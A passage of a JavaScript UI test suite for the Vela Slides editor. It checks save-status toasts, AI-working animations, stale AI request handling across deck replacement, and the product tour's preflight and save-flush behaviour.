    const dismiss = () => { const x = _$('[data-testid="save-failed-toast"] [title="Dismiss"]'); if (x) _click(x); };
    // Start armed from a clean saved state.
    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
    await _wait(60);
    // 1) First failure raises the one-shot toast → dismiss it.
    window.__velaOnSaveStatus({ state: "failed", at: Date.now(), error: "mock" });
    await _waitFor(() => toast(), 2000);
    dismiss();
    await _waitFor(() => !toast(), 1500);
    // 2) reconnecting → failed AGAIN with NO successful save in between: must stay dismissed.
    window.__velaOnSaveStatus({ state: "reconnecting", at: Date.now() });
    await _wait(80);
    window.__velaOnSaveStatus({ state: "failed", at: Date.now(), error: "mock2" });
    await _wait(300);
    if (toast()) throw new Error("dismissed toast wrongly re-armed on reconnecting→failed (no save between)");
    // 3) A genuine successful save re-arms; a subsequent failure MAY show again.
    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
    await _wait(80);
    window.__velaOnSaveStatus({ state: "failed", at: Date.now(), error: "mock3" });
    await _waitFor(() => toast(), 2000);
    // Cleanup.
    dismiss();
    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
    await _wait(40);
    window.__velaOnSaveStatus(null);
    await _wait(40);
  }},
  { name: "reconnecting renders an amber pill; then cleans up", fn: async () => {
    window.__velaOnSaveStatus({ state: "reconnecting", at: Date.now() });
    const pill = await _waitFor(() => (_saveState() === "reconnecting" ? _savePill() : null), 2000);
    if (!/Reconnect/i.test(pill.textContent || "")) throw new Error("reconnecting copy missing: " + pill.textContent);
    // Cleanup so the pill/toast don't leak into later suites.
    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
    await _wait(60);
    window.__velaOnSaveStatus(null);
    await _waitFor(() => _savePill() == null, 1500).catch(() => {});
  }},
]);

// ── CR5: Consistent AI-working animation ─────────────────────────────
// Deterministic, offline-friendly proof of the unified aiWork → vera-thinking /
// magic-reveal contract. No live AI backend needed: we drive the reducer flag
// directly via the app's test hook (_hooks().setAIWork) and assert the
// on-screen slide's fx-wrapper class contract, the accent CSS var, off-screen
// isolation, and the CSS (accent-tinted sweep + reduced-motion) rules.
const _fxWrap = () => _$("[data-testid='slide-fx-wrapper']");
// Canonicalize a CSS color so an authored hex and a browser rgb() serialization
// compare equal. --vera-accent is a registered custom property
// (@property { syntax: "<color>" }) — once registered, getComputedStyle returns
// the COMPUTED "rgb(r, g, b)" form, not the "#rrggbb" the deck authored. Round
// tripping both sides through an element's computed `color` normalizes either
// serialization; if the UA can't parse the value we fall back to a whitespace-
// stripped lowercase compare (the pre-registration behaviour).
const _normColor = (v) => {
  const raw = String(v == null ? "" : v).trim();
  const flat = raw.toLowerCase().replace(/\s+/g, "");
  if (!raw) return "";
  try {
    const el = document.createElement("span");
    el.style.color = raw;
    if (!el.style.color) return flat;      // UA rejected it — nothing to normalize
    el.style.position = "absolute";
    el.style.visibility = "hidden";
    document.body.appendChild(el);
    const out = getComputedStyle(el).color;
    el.remove();
    return out ? out.toLowerCase().replace(/\s+/g, "") : flat;
  } catch { return flat; }
};
// Return the fx-wrapper to a static state (clear the flag, wait out any settle).
const _settleFx = async () => {
  if (typeof _hooks().setAIWork === "function") _hooks().setAIWork(null);
  await _waitFor(() => { const w = _fxWrap(); return w && !w.classList.contains("magic-reveal") && !w.classList.contains("vera-thinking"); }, 2600).catch(() => {});
};
// Bring the app to editor mode with a slide (and its fx-wrapper) on screen —
// a prior suite may leave it in fullscreen / gallery / a modal / a collapsed rail.
const _cr5Setup = async () => {
  await _exitFullscreen();
  document.activeElement?.blur?.();
  for (let i = 0; i < 3; i++) { _key("Escape"); await _wait(90); }
  // Prefer a TOC slide row — clicking it selects a module that actually HAS a
  // slide (the first .concept-row can be an empty section → "No slides yet",
  // which renders no fx-wrapper). Fall back to scanning module rows for one with
  // slides on screen.
  const toc = _tocRows()[0];
  if (toc) { _click(toc); await _wait(200); }
  if (!_$("[data-testid='slide-viewport']")) {
    for (const r of _$$(".concept-row")) { _click(r); await _wait(150); if (_$("[data-testid='slide-viewport']")) break; }
  }
  await _waitFor(_fxWrap, 3000).catch(() => {});
};
// Collect all readable CSS text (same-origin inline <style>; skip cross-origin).
const _allCssText = () => {
  let css = "";
  for (const sheet of Array.from(document.styleSheets)) {
    let rules; try { rules = sheet.cssRules; } catch { continue; }
    if (!rules) continue;
    for (const r of Array.from(rules)) css += r.cssText + "\n";
  }
  return css;
};
uiSuite("AI-working animation (CR5)", [
  { name: "test hooks + fx-wrapper present", fn: async () => {
    if (typeof _hooks().setAIWork !== "function") throw new Error("setAIWork test hook not exposed");
    if (typeof _hooks().getSelection !== "function") throw new Error("getSelection test hook not exposed");
    await _cr5Setup();
    if (!_fxWrap()) throw new Error("no fx-wrapper — diag=" + JSON.stringify({ conceptRows: _$$(".concept-row").length, tocRows: _tocRows().length, vp: !!_$("[data-testid='slide-viewport']"), sel: _hooks().getSelection() }));
  }},
  { name: "SET_AI_WORK on the on-screen slide → vera-thinking scan + accent var", fn: async () => {
    await _settleFx();
    const sel = _hooks().getSelection();
    if (!sel) throw new Error("no slide selected");
    _hooks().setAIWork({ itemId: sel.itemId, slideIdx: sel.slideIdx });
    const w = await _waitFor(() => { const x = _fxWrap(); return x && x.classList.contains("vera-thinking") ? x : null; }, 2500);
    if (w.getAttribute("data-ai-working") !== "1") throw new Error("data-ai-working mirror not set");
    // Accent-tinted sweep: --vera-accent must be a non-empty color; when the
    // slide carries an accent it must equal it (the sweep matches the slide).
    const acc = getComputedStyle(w).getPropertyValue("--vera-accent").trim();
    if (!acc) throw new Error("--vera-accent empty while working");
    if (sel.accent) {
      // Serialization-tolerant: --vera-accent may come back as rgb(...) once the
      // custom property is registered, while the deck authors a hex.
      const a = _normColor(acc), b = _normColor(sel.accent);
      if (a !== b) throw new Error(`--vera-accent=${acc} (${a}) != slide accent ${sel.accent} (${b})`);
    }
    await _settleFx();
  }},
  { name: "clearing SET_AI_WORK → vera-thinking gone + magic-reveal settle", fn: async () => {
    await _settleFx();
    const sel = _hooks().getSelection();
    if (!sel) throw new Error("no slide selected");
    _hooks().setAIWork({ itemId: sel.itemId, slideIdx: sel.slideIdx });
    await _waitFor(() => _fxWrap()?.classList.contains("vera-thinking"), 2500);
    _hooks().setAIWork(null);
    // The completion effect swaps the scan for the one-shot magic-reveal.
    await _waitFor(() => { const w = _fxWrap(); return w && !w.classList.contains("vera-thinking") && w.classList.contains("magic-reveal"); }, 2500);
    // …and the reveal is one-shot — it settles back to static.
    await _waitFor(() => !_fxWrap()?.classList.contains("magic-reveal"), 3000).catch(() => {});
  }},
  { name: "off-screen target does NOT animate the on-screen slide", fn: async () => {
    await _settleFx();
    const sel = _hooks().getSelection();
    if (!sel) throw new Error("no slide selected");
    // A target that is not the on-screen slide (bogus itemId) must leave it static.
    _hooks().setAIWork({ itemId: "__cr5_no_such_item__", slideIdx: sel.slideIdx });
    await _wait(250);
    const w = _fxWrap();
    if (w && w.classList.contains("vera-thinking")) throw new Error("on-screen slide animated for an off-screen target");
    await _settleFx();
  }},
  { name: "D7: navigating away mid-op does NOT magic-reveal the destination slide", fn: async () => {
    await _settleFx();
    const sel = _hooks().getSelection();
    if (!sel) throw new Error("no slide selected");
    // Mark THIS slide as the AI target and confirm the working scan is up.
    _hooks().setAIWork({ itemId: sel.itemId, slideIdx: sel.slideIdx });
    await _waitFor(() => _fxWrap()?.classList.contains("vera-thinking"), 2500);
    // Navigate to another slide mid-op (either direction is a slideIndex change).
    const p0 = _slidePos();
    document.activeElement?.blur?.();
    _key("ArrowRight"); await _wait(140);
    if (_slidePos() === p0) { _key("ArrowLeft"); await _wait(140); }
    if (_slidePos() === p0) { await _settleFx(); return; } // single-slide deck: nothing to navigate
    // The destination slide must NOT play the completion settle — the op did not
    // finish here, the view merely moved. Give the effect ample time to (wrongly) fire.
    await _wait(400);
    const w = _fxWrap();
    if (w && w.classList.contains("magic-reveal")) throw new Error("destination slide wrongly played magic-reveal on mid-op navigation");
    await _settleFx();
  }},
  { name: "D7b: cross-module switch at same index does NOT magic-reveal destination (but genuine same-slide DOES)", fn: async () => {
    await _settleFx();
    // Map each TOC slide row to its {itemId, slideIdx} by selecting it.
    const n = _tocRows().length;
    if (n < 2) { await _settleFx(); return; } // single-slide deck — nothing to prove
    const meta = [];
    for (let i = 0; i < n; i++) { _click(_tocRows()[i]); await _wait(130); meta.push(_hooks().getSelection()); }
    // Module A = first slide-0 row; Module B = a LATER slide-0 row in a DIFFERENT module.
    let ai = -1, bi = -1;
    for (let i = 0; i < meta.length; i++) {
      if (meta[i] && meta[i].slideIdx === 0) {
        if (ai < 0) ai = i;
        else if (meta[i].itemId !== meta[ai].itemId) { bi = i; break; }
      }
    }
    if (ai < 0 || bi < 0) { await _settleFx(); return; } // deck lacks two modules with a slide-0 — soft pass
    // Select module A slide 0 and start its working scan.
    _click(_tocRows()[ai]); await _wait(160);
    const sA = _hooks().getSelection();
    _hooks().setAIWork({ itemId: sA.itemId, slideIdx: sA.slideIdx });
    await _waitFor(() => _fxWrap()?.classList.contains("vera-thinking"), 2500);
    // Single-step switch to module B slide 0 (same index, different module) while
    // aiWork is still set on A. The untouched destination must NOT settle.
    _click(_tocRows()[bi]); await _wait(180);
    const sB = _hooks().getSelection();
    if (!sB || sB.itemId === sA.itemId) { await _settleFx(); return; } // switch didn't land — soft pass
    await _wait(420); // give the completion effect ample time to (wrongly) fire
    const wB = _fxWrap();
    if (wB && wB.classList.contains("magic-reveal")) throw new Error("cross-module switch wrongly magic-revealed the untouched destination slide (0===0 index collision)");
    await _settleFx();
    // Control: a GENUINE same-slide completion must STILL magic-reveal (not over-suppressed).
    _click(_tocRows()[ai]); await _wait(160);
    const sA2 = _hooks().getSelection();
    _hooks().setAIWork({ itemId: sA2.itemId, slideIdx: sA2.slideIdx });
    await _waitFor(() => _fxWrap()?.classList.contains("vera-thinking"), 2500);
    _hooks().setAIWork(null);
    await _waitFor(() => { const x = _fxWrap(); return x && x.classList.contains("magic-reveal"); }, 2500);
    await _settleFx();
  }},
  { name: "CSS: accent-tinted .vera-thinking + .magic-reveal rules exist", fn: async () => {
    const css = _allCssText();
    if (!/\.vera-thinking/.test(css)) throw new Error(".vera-thinking rule missing");
    if (!/\.magic-reveal/.test(css)) throw new Error(".magic-reveal rule missing");
    if (!/--vera-accent/.test(css)) throw new Error(".vera-thinking sweep not parameterized by --vera-accent");
  }},
  { name: "CSS: prefers-reduced-motion zeroes the working scan", fn: async () => {
    let found = false;
    for (const sheet of Array.from(document.styleSheets)) {
      let rules; try { rules = sheet.cssRules; } catch { continue; }
      if (!rules) continue;
      for (const r of Array.from(rules)) {
        // CSSMediaRule (type 4) — r.cssText carries the full nested block.
        const txt = r.cssText || "";
        if (r.type === 4 && /prefers-reduced-motion/i.test(txt) && /\.vera-thinking/.test(txt) && /animation[^;]*none/i.test(txt)) found = true;
      }
    }
    if (!found) throw new Error("prefers-reduced-motion block zeroing .vera-thinking animation missing");
  }},
], { setup: _cr5Setup });

// ── AI editor request ownership ─────────────────────────────────────
const _editorOwnershipSetup = async () => {
  if (!_hooks().restoreStartupDeck?.()) throw new Error("startup deck fixture missing");
  await _cr5Setup();
};
const _openQuickEditor = async () => {
  const open = await _waitFor(() => {
    const button = _$("[data-testid='quick-edit-open']");
    return button && !button.disabled ? button : null;
  }, 2000);
  _click(open);
  return _waitFor(() => _$("[data-testid='quick-edit-input']"), 1500);
};
const _openAiSlideAdder = async () => {
  _click(await _waitFor(() => _$("[data-testid='add-slide-menu-open']"), 2000));
  _click(await _waitFor(() => _$("[data-testid='ai-slide-adder-open']"), 1500));
  return _waitFor(() => _$("[data-testid='ai-slide-adder-input']"), 1500);
};
uiSuite("AI editor request ownership", [
  { name: "Old Quick Edit completion cannot unlock or change the replacement editor", fn: async () => {
    const hooks = _hooks();
    const transport = hooks.installDeferredAgentTransport?.();
    if (!transport || !hooks.loadReplacementDeckForTest || !hooks.getDeckStateForTest) throw new Error("editor ownership test hooks missing");
    try {
      const oldInput = await _openQuickEditor();
      _type(oldInput, "old quick edit");
      _click("[data-testid='quick-edit-apply']");
      await _waitFor(() => transport.pending() === 1, 1500);

      hooks.loadReplacementDeckForTest();
      await _waitFor(() => !_$("[data-testid='quick-edit-input']"), 1500);
      await _wait(80);
      const newInput = await _openQuickEditor();
      _type(newInput, "new quick edit");
      _click("[data-testid='quick-edit-apply']");
      await _waitFor(() => transport.pending() === 2, 1500);

      transport.resolveNext(JSON.stringify({ blocks: [{ type: "heading", text: "OLD QUICK RESULT", size: "2xl" }] }));
      await _waitFor(() => transport.pending() === 1, 1500);
      await _wait(120);
      const during = hooks.getDeckStateForTest();
      if (!_$("[data-testid='quick-edit-loading']") || _$("[data-testid='quick-edit-input']")) {
        throw new Error("old Quick Edit completion unlocked the new request");
      }
      if (during.firstBlockText !== "REPLACEMENT CONTENT SENTINEL") {
        throw new Error(`old Quick Edit changed the replacement deck: ${JSON.stringify(during)}`);
      }

      transport.resolveNext(JSON.stringify({ blocks: [{ type: "heading", text: "NEW QUICK RESULT", size: "2xl" }] }));
      await _waitFor(() => transport.pending() === 0, 1500);
      await _waitFor(() => hooks.getDeckStateForTest().firstBlockText === "NEW QUICK RESULT", 2000);
    } finally {
      while (transport.pending()) transport.resolveNext(JSON.stringify({ blocks: [{ type: "heading", text: "cleanup", size: "2xl" }] }));
      transport.restore();
      hooks.restoreStartupDeck?.();
      await _wait(100);
    }
  }},
  { name: "Canceled inline slide completion cannot unlock or change a newer adder", fn: async () => {
    const hooks = _hooks();
    const transport = hooks.installDeferredAgentTransport?.();
    if (!transport || !hooks.getDeckStateForTest) throw new Error("inline adder ownership test hooks missing");
    try {
      const rowsBefore = _$$("[data-testid='toc-slide-row']").length;
      const oldInput = await _openAiSlideAdder();
      _type(oldInput, "old inline slide");
      _click("[data-testid='ai-slide-adder-generate']");
      await _waitFor(() => transport.pending() === 1, 1500);

      _click("[data-testid='ai-slide-adder-close']");
      await _waitFor(() => !_$("[data-testid='ai-slide-adder-input']"), 1500);
      const newInput = await _openAiSlideAdder();
      _type(newInput, "new inline slide");
      _click("[data-testid='ai-slide-adder-generate']");
      await _waitFor(() => transport.pending() === 2, 1500);

      transport.resolveNext(JSON.stringify({ blocks: [{ type: "heading", text: "OLD INLINE ADD RESULT", size: "2xl" }], duration: 30 }));
      await _waitFor(() => transport.pending() === 1, 1500);
      await _wait(120);
      const currentInput = _$("[data-testid='ai-slide-adder-input']");
      if (!currentInput?.disabled || _$$("[data-testid='toc-slide-row']").length !== rowsBefore) {
        throw new Error("old inline slide completion unlocked or inserted into the new editor");
      }

      transport.resolveNext(JSON.stringify({ blocks: [{ type: "heading", text: "NEW INLINE ADD RESULT", size: "2xl" }], duration: 30 }));
      await _waitFor(() => transport.pending() === 0, 1500);
      await _waitFor(() => _$$("[data-testid='toc-slide-row']").length === rowsBefore + 1, 2000);
      await _waitFor(() => hooks.getDeckStateForTest().selectedBlockText === "NEW INLINE ADD RESULT", 2000);
    } finally {
      while (transport.pending()) transport.resolveNext(JSON.stringify({ blocks: [{ type: "heading", text: "cleanup", size: "2xl" }], duration: 30 }));
      transport.restore();
      hooks.restoreStartupDeck?.();
      await _wait(100);
    }
  }},
], { setup: _editorOwnershipSetup });

// ── Product Tour Suite ───────────────────────────────────────────────
const _productTourSetup = async () => {
  if (!_hooks().restoreStartupDeck?.()) throw new Error("startup deck fixture missing");
  await _waitFor(() => window.__velaDemoTest?.deckFingerprint?.() === DEMO_DECK_FINGERPRINT, 3000);
  await _cr5Setup();
};
uiSuite("Product Tour", [
  { name: "Scene order, feature count, badges, and duration stay inside budget", fn: async () => {
    const api = window.__velaDemoTest;
    if (!api) throw new Error("demo test hook missing");
    const plan = api.plan();
    const expected = [
      "Vela Slides",
      "Shape the Story",
      "Edit Text, Live",
      "Show a Process",
      "Explain the Data",
      "Compare, Funnel & Cycle",
      "Numbers, Matrix & Checklist",
      "Rich Column Layouts",
      "See the Whole Deck",
      "Brand & Guidelines",
      "Comment & Review",
      "Present with Confidence",
      "Student & Audience Tools",
      "Use the Presenter Dashboard",
      "Improve, Edit with AI & Variants",
      "Work with Vera",
      "Vela CLI & Skill",
      "Bring Your Own Agent",
      "Export a Print-Ready PDF",
      "Export Editable PowerPoint",
      "Ready to Build",
    ];
    if (JSON.stringify(plan.titles) !== JSON.stringify(expected)) throw new Error(`scene order changed: ${JSON.stringify(plan.titles)}`);
    if (plan.titles.length < 20) throw new Error(`fewer than 20 scenes: ${plan.titles.length}`);
    if (plan.totalDuration < 60000 || plan.totalDuration > 120000) throw new Error(`duration ${plan.totalDuration}ms is outside budget`);
    if (plan.totalDuration !== plan.durations.reduce((sum, ms) => sum + ms, 0)) throw new Error("duration total does not match scene durations");
    const badges = api.badges ? api.badges() : [];
    if (badges.length < 5) throw new Error(`fewer than 5 NEW badges: ${badges.length}`);
    for (const badge of badges) {
      if (!plan.titles.includes(badge.scene)) throw new Error(`badge scene not in tour: ${badge.scene}`);
      if (!/^1[3-9]\.\d+$/.test(badge.version) || Number(badge.version) <= 13.0) throw new Error(`badge version not post-13.0: ${badge.version}`);
    }
  }},
  { name: "Tour blocks active AI work and unsupported decks", fn: async () => {
    const api = window.__velaDemoTest;
    const hooks = _hooks();
    if (!api?.unavailableReason || !hooks.setAIWork) throw new Error("demo preflight test hook missing");
    if (api.unavailableReason()) throw new Error(`bundled demo deck rejected: ${api.unavailableReason()} signature=${api.deckSignature?.()} fingerprint=${api.deckFingerprint?.()}`);
    if (api.deckFingerprint?.() !== DEMO_DECK_FINGERPRINT) throw new Error(`sanitized startup fingerprint changed: ${api.deckFingerprint?.()}`);
    if (!api.unavailableReason({ lanes: [], chatLoading: false, aiWork: null }).includes("bundled Vela demo deck")) {
      throw new Error("unsupported deck was not rejected");
    }
    const hostileReason = api.unavailableReason({ lanes: [null, { items: [null, { title: [], slides: {} }] }], chatLoading: false, aiWork: null });
    if (!hostileReason.includes("bundled Vela demo deck")) throw new Error(`hostile sanitized state was not rejected safely: ${hostileReason}`);
    hooks.setAIWork({ itemId: "*", slideIdx: 0 });
    await _wait(50);
    const button = _$("[data-testid='run-demo']");
    if (!button?.disabled) throw new Error("tour button stayed enabled during AI work");
    const blocked = new Promise((resolve) => window.addEventListener("vela-demo-blocked", (event) => resolve(event.detail), { once: true }));
    api.run(0.02);
    const detail = await Promise.race([blocked, _wait(1000).then(() => { throw new Error("tour did not report its active-AI block"); })]);
    if (!detail.reason.includes("Wait for Vera")) throw new Error(`unexpected block reason: ${detail.reason}`);
    if (document.documentElement.dataset.velaDemoRunning === "true" || _$("[data-testid='demo-overlay']")) {
      throw new Error("tour started during AI work");
    }
    hooks.setAIWork(null);
    await _wait(50);
    const releaseAI1 = api.holdAIActivity?.();
    const releaseAI2 = api.holdAIActivity?.();
    if (typeof releaseAI1 !== "function" || typeof releaseAI2 !== "function" || !api.unavailableReason().includes("Wait for Vera")) {
      throw new Error("shared live-AI activity did not block the tour");
    }
    releaseAI1();
    releaseAI1();
    if (!api.unavailableReason().includes("Wait for Vera")) throw new Error("AI activity lease released another operation");
    releaseAI2();
    const draft = document.createElement("textarea");
    draft.value = "unsent user draft";
    document.body.appendChild(draft);
    if (!api.unavailableReason().includes("editor drafts")) throw new Error("unsent draft was not rejected");
    draft.remove();
    if (api.unavailableReason()) throw new Error(`tour stayed blocked after draft cleanup: ${api.unavailableReason()}`);

    if (!hooks.injectBlocks?.([{ type: "heading", text: "Changed scene-critical content" }])) throw new Error("could not mutate the fingerprint test slide");
    await _wait(80);
    if (!api.unavailableReason().includes("bundled Vela demo deck")) throw new Error("scene-critical content change did not reject tour preflight");
    if (!hooks.restoreStartupDeck()) throw new Error("could not restore startup fixture after fingerprint test");
    await _waitFor(() => api.deckFingerprint() === DEMO_DECK_FINGERPRINT, 3000);

    const restoreCanonical = async () => {
      if (!hooks.restoreStartupDeck()) throw new Error("could not restore startup fixture");
      await _waitFor(() => api.deckFingerprint() === DEMO_DECK_FINGERPRINT && !api.unavailableReason(), 3000);
    };
    const interruptWithDeckAction = async (label, action, expectedChat) => {
      await restoreCanonical();
      hooks.addTeacherMessage("__epoch-test", `old ${label} teacher state`);
      await _wait(40);
      const beforeEpoch = hooks.getDeckEpoch?.();
      const started = new Promise((resolve) => window.addEventListener("vela-demo-scene", resolve, { once: true }));
      const done = new Promise((resolve) => window.addEventListener("vela-demo-complete", (event) => resolve(event.detail), { once: true }));
      api.run(0.02);
      await Promise.race([started, _wait(1500).then(() => { throw new Error(`${label} interruption tour did not start`); })]);
      action();
      const result = await Promise.race([done, _wait(5000).then(() => { throw new Error(`${label} interruption tour did not stop`); })]);
      if (result.reason !== "stopped") throw new Error(`${label} interruption result: ${JSON.stringify(result)}`);
      if (hooks.getDeckEpoch?.() !== beforeEpoch + 1) throw new Error(`${label} did not increment the private deck epoch`);
      if (Object.keys(hooks.getTeacherHistory?.() || {}).length !== 0) throw new Error(`${label} restored Teacher state from the old deck`);
      const chat = hooks.getChatState?.();
      if (expectedChat && !chat?.messages?.some((message) => message.content?.includes(expectedChat))) {
        throw new Error(`${label} restored chat state from the old deck`);
      }
      if (document.documentElement.dataset.velaDemoRunning === "true" || window.__velaDemoAI) throw new Error(`${label} left the tour lock or AI mock active`);
    };
    await interruptWithDeckAction("LOAD", () => hooks.restoreStartupDeck(), "Deck imported successfully");
    await interruptWithDeckAction("NEW_DECK", () => hooks.newDeckForTest?.(), "Setting sail on a new deck");
    if (!hooks.getChatState?.()?.open) throw new Error("NEW_DECK chat state was overwritten by tour cleanup");
    await interruptWithDeckAction("RESET", () => hooks.resetDeckForTest?.(), "Welcome aboard Vela");

    await restoreCanonical();
    if (typeof api.runWithMalformedSnapshot !== "function") throw new Error("malformed snapshot test hook missing");
    const malformedStarted = new Promise((resolve) => window.addEventListener("vela-demo-scene", resolve, { once: true }));
    const malformedDone = new Promise((resolve) => window.addEventListener("vela-demo-complete", (event) => resolve(event.detail), { once: true }));
    api.runWithMalformedSnapshot();
    await Promise.race([malformedStarted, _wait(1500).then(() => { throw new Error("malformed-state tour did not start"); })]);
    api.stop();
    const malformedResult = await Promise.race([malformedDone, _wait(5000).then(() => { throw new Error("malformed-state tour did not stop"); })]);
    if (malformedResult.reason !== "stopped") throw new Error(`malformed-state result: ${JSON.stringify(malformedResult)}`);
    if (document.documentElement.dataset.velaDemoRunning === "true" || window.__velaDemoAI) {
      throw new Error("malformed snapshot or UI state left the tour lock active");
    }
    await restoreCanonical();
  }},
  { name: "Post-unlock flush saves restored state and the replacement deck", fn: async () => {
    const api = window.__velaDemoTest;
    const hooks = _hooks();
    if (!api || !hooks.capturePostDemoFlushForTest || !hooks.flushDemoSaveForTest) throw new Error("post-demo flush hooks missing");
    if (!hooks.restoreStartupDeck?.()) throw new Error("startup fixture missing");
    await _waitFor(() => api.deckFingerprint() === DEMO_DECK_FINGERPRINT, 3000);

    const originalStorage = window.storage;
    const originalLocalSend = window.__velaSendDeckUpdate;
    const storageWrites = [];
    const localWrites = [];
    window.storage = {
      ...(originalStorage || {}),
      set: async (key, value) => { storageWrites.push({ key, value: JSON.parse(value) }); },
      delete: async () => {},
    };
    window.__velaSendDeckUpdate = (payload) => { localWrites.push(JSON.parse(JSON.stringify(payload))); };
    try {
      hooks.setGuidelinesForTest("saved before tour");
      await _wait(50);
      const started = new Promise((resolve) => window.addEventListener("vela-demo-scene", resolve, { once: true }));
      const done = new Promise((resolve) => window.addEventListener("vela-demo-complete", (event) => resolve(event.detail), { once: true }));
      api.run(0.02);
      await Promise.race([started, _wait(1500).then(() => { throw new Error("save-flush tour did not start"); })]);
      api.stop();
      const result = await Promise.race([done, _wait(5000).then(() => { throw new Error("save-flush tour did not stop"); })]);
      if (result.reason !== "stopped") throw new Error(`save-flush result: ${JSON.stringify(result)}`);
      await _waitFor(() => storageWrites.length === 1, 2000);
      if (storageWrites[0].value.guidelines !== "saved before tour") throw new Error("actual tour unlock did not save restored browser state");
      if (localWrites.length) throw new Error("artifact-mode tour used the local save sink");

      storageWrites.length = 0;
      localWrites.length = 0;
      const request = hooks.capturePostDemoFlushForTest();
      document.documentElement.dataset.velaDemoRunning = "true";
      hooks.setGuidelinesForTest("tour transient");
      hooks.flushDemoSaveForTest(request, { local: true, storage: false });
      await _wait(180);
      if (storageWrites.length || localWrites.length) throw new Error("save sink ran while the tour lock was active");
      hooks.setGuidelinesForTest("saved before tour");
      delete document.documentElement.dataset.velaDemoRunning;
      await _waitFor(() => localWrites.length === 1, 2000);
      if (storageWrites.length || localWrites[0].guidelines !== "saved before tour") {
        throw new Error("post-unlock flush persisted tour-generated state");
      }

      storageWrites.length = 0;
      localWrites.length = 0;
      hooks.restoreStartupDeck();
      await _wait(50);
      hooks.setGuidelinesForTest("replacement deck state");
      await _wait(50);
      const replacement = hooks.capturePostDemoFlushForTest();
      document.documentElement.dataset.velaDemoRunning = "true";
      hooks.flushDemoSaveForTest(replacement, { local: true, storage: true });
      delete document.documentElement.dataset.velaDemoRunning;
      await _waitFor(() => storageWrites.length === 1 && localWrites.length === 1, 2000);
      if (storageWrites[0].value.deckTitle !== "Vela Slides — Live Demo" || storageWrites[0].value.guidelines !== "replacement deck state"
          || localWrites[0].guidelines !== "replacement deck state") {
        throw new Error("replacement deck state did not flush after unlock");
      }
    } finally {
      window.storage = originalStorage;
      window.__velaSendDeckUpdate = originalLocalSend;
      delete document.documentElement.dataset.velaDemoRunning;
      hooks.restoreStartupDeck?.();
      await _wait(100);
    }
  }},
  { name: "Deck replacement stops the live tour and flushes only replacement state", fn: async () => {
    const api = window.__velaDemoTest;
    const hooks = _hooks();
    if (!api || !hooks.loadReplacementDeckForTest || !hooks.getDeckStateForTest) throw new Error("replacement-deck test hooks missing");
    const originalStorage = window.storage;
    const storageWrites = [];
    window.storage = {
      ...(originalStorage || {}),
      set: async (key, value) => { storageWrites.push({ key, value: JSON.parse(value) }); },
      delete: async () => {},
    };
    try {
      const beforeEpoch = hooks.getDeckEpoch();
      const started = new Promise((resolve) => window.addEventListener("vela-demo-scene", resolve, { once: true }));
      const done = new Promise((resolve) => window.addEventListener("vela-demo-complete", (event) => resolve(event.detail), { once: true }));
      api.run(0.02);
      await Promise.race([started, _wait(1500).then(() => { throw new Error("replacement tour did not start"); })]);
      if (!hooks.loadReplacementDeckForTest()) throw new Error("replacement deck did not load");
      const result = await Promise.race([done, _wait(5000).then(() => { throw new Error("replacement tour did not finalize"); })]);
      if (result.reason !== "stopped") throw new Error(`replacement tour result: ${JSON.stringify(result)}`);
      await _waitFor(() => storageWrites.some((write) => write.value.deckTitle === "Replacement deck sentinel"), 2500);
      const current = hooks.getDeckStateForTest();
      if (current.epoch !== beforeEpoch + 1
          || current.deckTitle !== "Replacement deck sentinel"
          || current.guidelines !== "replacement epoch retained"
          || current.firstItemTitle !== "Replacement module sentinel"
          || current.firstBlockText !== "REPLACEMENT CONTENT SENTINEL"
          || current.chatLoading || current.aiWork
          || Object.keys(current.teacherHistory || {}).length) {
        throw new Error(`replacement state was changed by tour cleanup: ${JSON.stringify(current)}`);
      }
      const saved = storageWrites.find((write) => write.value.deckTitle === "Replacement deck sentinel")?.value;
      if (saved?.guidelines !== "replacement epoch retained"
          || saved?.lanes?.[0]?.items?.[0]?.title !== "Replacement module sentinel"
          || saved?.lanes?.[0]?.items?.[0]?.slides?.[0]?.blocks?.[0]?.text !== "REPLACEMENT CONTENT SENTINEL") {
        throw new Error(`replacement state was not flushed intact: ${JSON.stringify(saved)}`);
      }
    } finally {
      window.storage = originalStorage;
      delete document.documentElement.dataset.velaDemoRunning;
      hooks.restoreStartupDeck?.();
      await _wait(100);
    }
  }},
  { name: "Old chat and toolbar AI results cannot change a replacement deck", fn: async () => {
    const hooks = _hooks();
    if (!hooks.installDeferredAgentTransport || !hooks.loadReplacementDeckForTest || !hooks.getDeckStateForTest) {
      throw new Error("deferred AI test hooks missing");
    }
    const transport = hooks.installDeferredAgentTransport();
    const assertReplacement = (label) => {
      const current = hooks.getDeckStateForTest();
      if (current.deckTitle !== "Replacement deck sentinel"
          || current.firstItemTitle !== "Replacement module sentinel"
          || current.firstBlockText !== "REPLACEMENT CONTENT SENTINEL"
          || current.chatLoading || current.aiWork
          || current.chatMessages.some((message) => /OLD (CHAT|FINAL|TOOLBAR)/.test(message.content || ""))) {
        throw new Error(`${label} changed replacement state: ${JSON.stringify(current)}`);
      }
    };
    try {
      hooks.setChatOpenForTest(true);
      const chatInput = await _waitFor(() => _$("[data-testid='vera-chat-input']"), 1500);
      _type(chatInput, "old epoch chat request");
      _click("[data-testid='vera-chat-send']");
      await _waitFor(() => transport.pending() === 1, 1500);
      hooks.loadReplacementDeckForTest();
      transport.resolveNext(JSON.stringify({ message: "OLD CHAT TOOL", tool_calls: [{ tool: "clear_all", input: {} }] }));
      await _waitFor(() => transport.pending() === 1, 1500);
      transport.resolveNext(JSON.stringify({ message: "OLD FINAL", tool_calls: [] }));
      await _waitFor(() => transport.pending() === 0, 1500);
      await _wait(120);
      assertReplacement("old chat result");

      const oldEpoch = hooks.getDeckStateForTest().epoch;
      hooks.restoreStartupDeck();
      hooks.setChatOpenForTest(false);
      // The deck-epoch reset effect closes any stale editor a moment after
      // restoreStartupDeck(). Wait for the new epoch before opening Quick
      // Edit, or this click can race the old DOM and hit a closing button.
      await _waitFor(() => hooks.getDeckStateForTest().epoch === oldEpoch + 1, 1500);
      const quickOpen = await _waitFor(() => {
        const button = _$("[data-testid='quick-edit-open']");
        return button && !button.disabled ? button : null;
      }, 1500);
      _click(quickOpen);
      const quickInput = await _waitFor(() => _$("[data-testid='quick-edit-input']"), 1500);
      _type(quickInput, "old toolbar edit");
      _click("[data-testid='quick-edit-apply']");
